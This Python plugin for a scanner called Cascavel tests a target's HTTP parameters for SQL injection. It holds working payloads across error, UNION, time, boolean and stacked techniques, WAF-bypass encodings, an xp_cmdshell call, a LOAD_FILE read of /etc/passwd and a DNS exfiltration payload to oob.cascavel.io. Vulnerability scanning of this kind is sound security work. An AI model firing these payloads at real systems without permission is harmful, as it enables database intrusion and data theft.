# plugins/sqli_scanner.py — Cascavel 2026 Intelligence
import time
import urllib.parse

import requests

PARAMS = [
    "id",
    "user",
    "username",
    "page",
    "name",
    "search",
    "query",
    "cat",
    "item",
    "product",
    "order",
    "sort",
    "filter",
    "type",
    "action",
    "report",
    "role",
    "update",
    "key",
    "email",
    "year",
    "month",
    "col",
    "field",
    "row",
    "view",
    "table",
    "dir",
    "from",
    "to",
]

# ──────────── ERROR-BASED PAYLOADS ────────────
ERROR_PAYLOADS = [
    # Classic
    ("' OR '1'='1", "CLASSIC_OR"),
    ("' OR '1'='1' --", "CLASSIC_COMMENT"),
    ("' OR '1'='1' #", "HASH_COMMENT"),
    ("1' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL_VERSION"),
    # EXTRACTVALUE / UPDATEXML (MySQL 5.1+)
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", "EXTRACTVALUE"),
    ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--", "UPDATEXML"),
    # PostgreSQL
    ("' AND 1=CAST((SELECT version()) AS int)--", "PG_CAST_ERROR"),
    # Oracle
    ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", "ORACLE_UTL"),
    # SQLite
    ("' AND 1=1 UNION SELECT sql FROM sqlite_master--", "SQLITE_SCHEMA"),
]

# ──────────── UNION-BASED (auto column detection) ────────────
UNION_PAYLOADS = [
    ("' UNION SELECT NULL--", "UNION_1COL"),
    ("' UNION SELECT NULL,NULL--", "UNION_2COL"),
    ("' UNION SELECT NULL,NULL,NULL--", "UNION_3COL"),
    ("' UNION SELECT NULL,NULL,NULL,NULL--", "UNION_4COL"),
    ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "UNION_5COL"),
    ("' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,version(),0x7e),NULL--", "UNION_VERSION"),
]

# ──────────── TIME-BASED BLIND ────────────
TIME_PAYLOADS = [
    ("' OR SLEEP(4)--", "TIME_MYSQL", 3.5),
    ("'; WAITFOR DELAY '0:0:4'--", "TIME_MSSQL", 3.5),
    ("' OR pg_sleep(4)--", "TIME_POSTGRES", 3.5),
    ("' || (SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END)--", "TIME_PG_CASE", 3.5),
    ("1; SELECT BENCHMARK(5000000,SHA1('test'))--", "BENCHMARK_MYSQL", 3.0),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(4)))a)--", "SUBQUERY_SLEEP", 3.5),
]

# ──────────── BOOLEAN-BASED BLIND ────────────
BOOL_PAYLOADS = [
    ("' AND 1=1--", "BOOL_TRUE"),
    ("' AND 1=2--", "BOOL_FALSE"),
    ("' AND SUBSTRING(@@version,1,1)='5'--", "BOOL_VERSION_5"),
    ("' AND SUBSTRING(@@version,1,1)='8'--", "BOOL_VERSION_8"),
]

# ──────────── WAF BYPASS 2026 ────────────
WAF_BYPASS_PAYLOADS = [
    ("' oR '1'='1", "CASE_ALTERNATION"),
    ("'/**/OR/**/1=1--", "INLINE_COMMENT"),
    ("' OR 1=1-- -", "DOUBLE_DASH_SPACE"),
    ("1' aNd 1=1 aNd '1'='1", "MIXED_CASE_AND"),
    ("'/*!50000OR*/1=1--", "VERSION_COMMENT"),
    ("' %55NION %53ELECT NULL--", "URL_ENCODE_KEYWORDS"),
    ("' uni%6fn se%6cect null--", "PARTIAL_ENCODE"),
    ("' /*!50000UNION*/ /*!50000SELECT*/ NULL--", "NESTED_COMMENT"),
    ("'+OR+'1'='1", "PLUS_CONCAT"),
    ("'||1=1--", "PIPE_OR"),
    # Double URL encoding
    ("%2527%2520OR%25201%253D1--", "DOUBLE_URL_ENCODE"),
    # HPP (HTTP Parameter Pollution)
    ("1&id=' OR '1'='1", "HPP_DUPLICATE"),
]

# ──────────── STACKED QUERIES ────────────
STACKED_PAYLOADS = [
    ("'; SELECT pg_sleep(4);--", "STACKED_PG"),
    ("'; EXEC xp_cmdshell('ping 127.0.0.1');--", "STACKED_MSSQL_CMD"),
    ("'; INSERT INTO log VALUES('cascavel');--", "STACKED_INSERT"),
]

# ──────────── OOB (Out-of-Band) ────────────
OOB_PAYLOADS = [
    ("' UNION SELECT LOAD_FILE('/etc/passwd')--", "OOB_LOAD_FILE"),
    ("' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.oob.cascavel.io\\\\a'))--", "OOB_DNS_EXFIL"),
]

SQL_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "pg_query",
    "sqlite3",
    "unclosed quotation",
    "you have an error in your sql",
    "microsoft ole db",
    "syntax error",
    "query failed",
    "warning: mysql",
    "valid mysql result",
    "postgresql",
    "unterminated string",
    "quoted string not properly terminated",
    "jdbc",
    "odbc",
    "hibernate",
    "sqlexception",
    "pdo",
    "sequelize",
    "typeorm",
    "prisma",
    "knex",
]


def _get_baseline_latency(target):
    """Calcula o tempo natural de resposta do servidor."""
    latencies = []
    for _ in range(3):
        try:
            start = time.time()
            requests.get(f"http://{target}/", timeout=8)
            latencies.append(time.time() - start)
        except Exception:
            continue
    if latencies:
        return sum(latencies) / len(latencies)
    return 0.5  # Default conservador se houver falha


def _get_404_baseline(target):
    """Captura a resposta de uma página inexistente para calcular a baseline de tamanho (Soft-404 / WAF)."""
    try:
        resp = requests.get(f"http://{target}/cascavel_nao_existe_12345", timeout=5)
        return len(resp.text)
    except Exception:
        return 0


def _check_error_based(resp_text, method, param, baseline_len):
    """Verifica erros SQL expostos na resposta com proteção de baseline diffing."""
    resp_len = len(resp_text)
    # Tolerância de 5% ou 50 bytes
    tolerance = max(baseline_len * 0.05, 50)
    diff_from_baseline = abs(resp_len - baseline_len)

    # Se a resposta de erro tiver o mesmo tamanho da baseline de erro 404/WAF, ignore
    if baseline_len > 0 and diff_from_baseline <= tolerance:
        return None

    lower = resp_text.lower()
    for err in SQL_ERRORS:
        if err in lower:
            return {
                "tipo": "SQLI_ERROR_BASED",
                "metodo": method,
                "parametro": param,
                "severidade": "CRITICO",
                "erro_detectado": err,
                "amostra": resp_text[:300],
                "diff_bytes": diff_from_baseline,
            }
    return None


def _check_time_based(method, elapsed, threshold, param, baseline_latency):
    """Detecta SQLi time-based via delay na resposta considerando a baseline natural."""
    if elapsed > (threshold + baseline_latency):
        return {
            "tipo": "SQLI_TIME_BASED",
            "metodo": method,
            "parametro": param,
            "severidade": "CRITICO",
            "tempo_resposta": round(elapsed, 2),
            "baseline_estimada": round(baseline_latency, 2),
        }
    return None


def _check_boolean_diff(r_true_len, r_false_len, r_baseline_len, param):
    """Detecta SQLi boolean-based via diferença de tamanho, considerando a baseline natural."""
    # Se a diferença entre o true e o baseline for pequena, mas o false divergir muito, é um indício
    diff_true_base = abs(r_true_len - r_baseline_len)
    diff_false_base = abs(r_false_len - r_baseline_len)
    diff_true_false = abs(r_true_len - r_false_len)

    # Tolerância de 2% para variações naturais da página (CSRF tokens, timestamps)
    tolerance = r_baseline_len * 0.02 if r_baseline_len > 0 else 50
    tolerance = max(tolerance, 50)  # Pelo menos 50 bytes

    # Condição: True é muito parecido com Baseline, e False é muito diferente
    # ou vice-versa, e a diferença entre eles é maior que a tolerância natural
    if diff_true_false > tolerance and (diff_true_base <= tolerance or diff_false_base <= tolerance):
        return {
            "tipo": "SQLI_BLIND_BOOLEAN",
            "parametro": param,
            "severidade": "ALTO",
            "diff_bytes": diff_true_false,
            "detalhes": f"True len: {r_true_len}, False len: {r_false_len}, Baseline: {r_baseline_len}",
        }
    return None


def _test_error_and_union(target, param, baseline_len):
    """Testa error-based e union-based em um parâmetro."""
    findings = []
    all_payloads = ERROR_PAYLOADS + UNION_PAYLOADS + WAF_BYPASS_PAYLOADS + OOB_PAYLOADS + STACKED_PAYLOADS
    for payload, method in all_payloads:
        url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
        try:
            resp = requests.get(url, timeout=8)
            vuln = _check_error_based(resp.text, method, param, baseline_len)
            if vuln:
                findings.append(vuln)
                if "CRITICO" in vuln.get("severidade", ""):
                    break
        except Exception:
            continue
    return findings


def _test_time_based(target, param, baseline_latency):
    """Testa time-based blind SQLi validando contra a baseline."""
    # Se a baseline natural já é altíssima (ex: > 8s), ignora time-based para evitar FP
    if baseline_latency > 8.0:
        return None

    for payload, method, threshold in TIME_PAYLOADS:
        url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
        try:
            start = time.time()
            requests.get(url, timeout=12)
            elapsed = time.time() - start
            vuln = _check_time_based(method, elapsed, threshold, param, baseline_latency)
            if vuln:
                return vuln
        except requests.Timeout:
            # Se deu timeout e a baseline já era alta, ignora. Senão, flag.
            if baseline_latency < 3.0:
                return {
                    "tipo": "SQLI_TIME_BASED",
                    "metodo": method,
                    "parametro": param,
                    "severidade": "ALTO",
                    "timeout": True,
                }
        except Exception:
            continue
    return None


def _test_boolean_based(target, param):
    """Testa boolean-based blind SQLi."""
    try:
        # Baseline request sem injection
        r_base = requests.get(f"http://{target}/?{param}=1", timeout=6)
        r_true = requests.get(f"http://{target}/?{param}=' AND 1=1--", timeout=6)
        r_false = requests.get(f"http://{target}/?{param}=' AND 1=2--", timeout=6)
        return _check_boolean_diff(len(r_true.text), len(r_false.text), len(r_base.text), param)
    except Exception:
        return None


def _test_post_injection(target, param, baseline_len):
    """Testa SQLi via POST body (JSON + form)."""
    for payload, method in ERROR_PAYLOADS[:5]:
        try:
            resp = requests.post(
                f"http://{target}/", json={param: payload}, timeout=6, headers={"Content-Type": "application/json"}
            )
            vuln = _check_error_based(resp.text, f"POST_{method}", param, baseline_len)
            if vuln:
                return vuln
        except Exception:
            continue
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner SQL Injection 2026-Grade — Error/Union/Time/Boolean/Stacked/OOB.

    Técnicas: EXTRACTVALUE/UPDATEXML (MySQL), CAST error (PG), UTL_INADDR (Oracle),
    UNION auto-column, time-based (SLEEP/WAITFOR/pg_sleep/BENCHMARK), boolean diff,
    WAF bypass (inline comments, version comments, double URL encoding, HPP),
    stacked queries, OOB DNS exfiltration, POST body injection.
    40+ payloads cobrindo MySQL/PostgreSQL/MSSQL/Oracle/SQLite.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    # 1. Calcular Baseline
    baseline_latency = _get_baseline_latency(target)
    baseline_len = _get_404_baseline(target)

    for param in PARAMS:
        # Error + Union + WAF bypass + OOB + Stacked
        vulns.extend(_test_error_and_union(target, param, baseline_len))

        # Time-based blind com Baseline Dinâmica
        time_vuln = _test_time_based(target, param, baseline_latency)
        if time_vuln:
            vulns.append(time_vuln)

        # Boolean-based blind
        bool_vuln = _test_boolean_based(target, param)
        if bool_vuln:
            vulns.append(bool_vuln)

        # POST injection
        post_vuln = _test_post_injection(target, param, baseline_len)
        if post_vuln:
            vulns.append(post_vuln)

    return {
        "plugin": "sqli_scanner",
        "versao": "2026.1",
        "tecnicas": [
            "error_based",
            "union_based",
            "time_based",
            "boolean_blind",
            "waf_bypass",
            "stacked_queries",
            "oob_exfil",
            "post_injection",
        ],
        "resultados": vulns if vulns else "Nenhuma SQL injection detectada",
    }
